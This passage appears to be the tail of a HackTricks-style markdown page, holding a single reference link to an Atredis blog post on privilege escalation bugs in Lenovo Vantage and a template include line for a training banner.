- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
